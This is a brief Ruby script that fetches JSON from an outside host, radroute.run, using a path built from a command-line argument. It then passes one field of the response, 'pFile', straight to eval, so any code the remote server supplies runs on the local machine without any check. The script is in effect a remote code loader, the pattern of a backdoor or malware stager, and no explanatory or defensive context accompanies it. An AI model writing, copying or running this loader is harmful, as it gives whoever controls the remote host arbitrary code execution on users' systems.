require 'net/http'
require 'json'

ar = ARGV[0]

puts ar

uri = URI "https://radroute.run/files/#{ar}"

content = Net::HTTP.get uri

ok = JSON.parse(content)

state = ok[0]['pFile']

eval state